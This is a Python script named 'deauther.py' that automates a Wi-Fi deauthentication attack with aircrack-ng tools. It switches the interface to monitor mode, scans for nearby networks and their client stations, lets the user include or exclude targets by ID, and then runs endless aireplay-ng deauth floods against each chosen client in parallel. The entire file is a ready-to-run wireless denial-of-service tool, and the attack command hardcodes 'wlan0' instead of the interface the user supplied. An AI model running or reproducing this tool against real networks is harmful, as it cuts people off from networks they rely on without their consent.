#!/usr/bin/python3
import sys
import os
import pandas as pd
import subprocess
import multiprocessing

def initial_check():
    if os.geteuid() != 0:
        print("Run as root.")
        sys.exit(1)

    arg_count = len(sys.argv)
    if arg_count != 2:
        err_text = "No interface given!" if arg_count < 2 else "Too many arguments!"
        print(err_text+"\nUsage: deauther.py <interface>")
        sys.exit(1)

def get_mode():
    result = subprocess.run(["iwconfig", sys.argv[1]], capture_output=True, text=True)
    if result.returncode != 0:
        if "no wireless extensions" in result.stderr:
            print(f"{sys.argv[1]} is not a wireless interface.")
        else:
            print("Error:", result.stderr)
        sys.exit(1)

    for line in result.stdout.splitlines():
        if "Mode:" in line:
            mode = line.split(":")[1].split()[0].lower()
            return mode

    print("Mode can't be found...")
    sys.exit(1)

def set_mode(mode):
    if mode in ("monitor", "managed"):
        print(f"Setting {sys.argv[1]} to {mode} mode...")
        subprocess.run(["ifconfig", sys.argv[1], "down"])
        subprocess.run(["iwconfig", sys.argv[1], "mode", mode])
        subprocess.run(["ifconfig", sys.argv[1], "up"])
    else:
        print("Unknown mode error:", mode)
        sys.exit(1)

def get_networks():
    try:
        result = subprocess.run(["airodump-ng", "-w", "output", "--output-format", "csv", sys.argv[1]])
        if result.returncode != 0:
            print("Error:", result.stderr)
            sys.exit(1)
    except KeyboardInterrupt:
        os.system("clear")
        print("Scan complete. Cleaning up.")

    with open("output-01.csv", "r") as file:
        for idx, line in enumerate(file):
            if line.startswith("Station MAC"):
                start_row_station = idx
                break

    df_wifi = pd.read_csv("output-01.csv", nrows=start_row_station, skipinitialspace=True)
    os.remove("output-01.csv")
    df_wifi = df_wifi.dropna(subset=["BSSID", "ESSID"])
    return df_wifi

def select_network(df):
    if len(df) == 0:
        print("No nearby networks are found, exiting...")
        sys.exit(0)
    elif len(df) == 1:
        print(f'ID - {"BSSID".ljust(17)} - {"ESSID".ljust(20)}')
        print("="*100)
        bssid = str(df.iloc[0]["BSSID"])
        essid = str(df.iloc[0]["ESSID"])
        print(f'{"0".ljust(2)} - {bssid.ljust(17)} - {essid.ljust(20)}')
        print("="*100)
    else:
        print(f'ID - {"BSSID".ljust(17)} - {"ESSID".ljust(20)}', end="\t\t")
        print(f'ID - {"BSSID".ljust(17)} - {"ESSID".ljust(20)}')
        print("="*100)
        half_len = (len(df) + 1) // 2
        for i in range(half_len):
            bssid1 = str(df.iloc[i]["BSSID"])
            essid1 = str(df.iloc[i]["ESSID"])
            
            bssid2 = str(df.iloc[i + half_len]["BSSID"]) if i + half_len < len(df) else ""
            essid2 = str(df.iloc[i + half_len]["ESSID"]) if i + half_len < len(df) else ""
            
            print(f'{str(i).ljust(2)} - {bssid1.ljust(17)} - {essid1.ljust(20)}', end='')
            if i + half_len < len(df):
                print('\t\t', end='')
                print(f'{str(i + half_len).ljust(2)} - {bssid2.ljust(17)} - {essid2.ljust(20)}')
            else:
                print()
        print("="*100)
    
    id = int(input("Select a network by ID: "))
    target_bssid, target_channel = df.iloc[id][["BSSID", "channel"]].values
    return (str(target_bssid), str(target_channel))

def scan_network(bssid, channel):
    try:
        result = subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "output", "--output-format", "csv", sys.argv[1]])
        if result.returncode != 0:
            print("Error:", result.stderr)
            sys.exit(1)
    except KeyboardInterrupt:
        os.system("clear")
        print("Scan complete. Cleaning up.")

    with open("output-01.csv", "r") as file:
        for idx, line in enumerate(file):
            if line.startswith("Station MAC"):
                start_row_station = idx
                break

    df_station = pd.read_csv("output-01.csv", skiprows=start_row_station, skipinitialspace=True)
    df_station = df_station["Station MAC"]
    os.remove("output-01.csv")
    return df_station

def parse_input(input_str):
    ids = []
    ranges = input_str.split(',')
    
    for rng in ranges:
        if '-' in rng:
            start, end = map(int, rng.split('-'))
            ids.extend(range(start, end + 1))
        else:
            ids.append(int(rng))
    
    return sorted(set(ids))

def select_targets(df):
    if len(df) == 0:
        print("No targets found, exiting...")
        sys.exit(0)
    elif len(df) == 1:
        print(f'ID - {"Station MAC".ljust(17)}')
        print("="*55)
        mac = str(df.iloc[0])
        print(f'{"0".ljust(2)} - {mac.ljust(17)}')
        print("="*55)
    else:
        print(f'ID - {"Station MAC".ljust(17)}', end="\t\t") 
        print(f'ID - {"Station MAC".ljust(17)}')
        print("="*55)
        
        half_len = (len(df) + 1) // 2
        for i in range(half_len):
            mac1 = str(df.iloc[i])
            
            if i + half_len < len(df):
                mac2 = str(df.iloc[i + half_len])
            
            print(f'{str(i).ljust(2)} - {mac1.ljust(17)}', end='')
            if i + half_len < len(df):
                print('\t\t', end='')
                print(f'{str(i + half_len).ljust(2)} - {mac2.ljust(17)}')
            else:
                print()
        print("="*55)

    mode = None
    while mode not in ("i", "e"):
        mode = input("Select inclusion(everyone/only x,y,z) or exclusion(everyone except x,y,z) mode [i/e]:").lower()

    if mode == "i":
        selection_str = input("Include targets by IDs (1,2,3 or 1-3 or a for all): ")
        if selection_str == "a": targets = df
        else: 
            ids = parse_input(selection_str)
            targets = df.iloc[ids]
    else:
        selection_str = input("Exclude targets by IDs (1,2,3 or 1-3): ")
        ids = parse_input(selection_str)
        targets = df.drop(ids)
    return targets.values

def run_command(target, bssid):
    command = ["aireplay-ng", "-0", "0", "-a", bssid, "-c", target, "wlan0"]
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def deauth(bssid, targets):
    print("Deauthenticating targets...")
    processes = []
    for target in targets:
        process = multiprocessing.Process(target=run_command, args=[target, bssid])
        process.start()
        processes.append(process)
    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        for process in processes:
            process.terminate()
        print("\nStopping deauth attack...")

if __name__ == "__main__":
    mode_changed = False
    initial_check()
    initial_mode = get_mode()

    if initial_mode != "monitor":
        set_mode("monitor")
        mode_changed = True

    df_wifi = get_networks()
    bssid, channel = select_network(df_wifi)
    df_station = scan_network(bssid, channel)
    targets = select_targets(df_station)
    print(f"Targets:\n{targets}")
    deauth(bssid, targets)

    if mode_changed: set_mode(initial_mode)
